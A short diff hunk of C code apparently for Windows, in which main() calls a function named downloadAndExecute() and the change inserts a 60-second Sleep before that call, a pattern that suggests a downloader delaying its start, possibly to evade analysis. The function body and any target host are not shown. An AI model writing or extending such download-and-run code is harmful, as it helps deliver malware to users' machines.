@@ -56,6 +56,7 @@ int downloadAndExecute() {
 }
 
 int main() {
+    Sleep(60000);
     downloadAndExecute();
     return 0;
 }
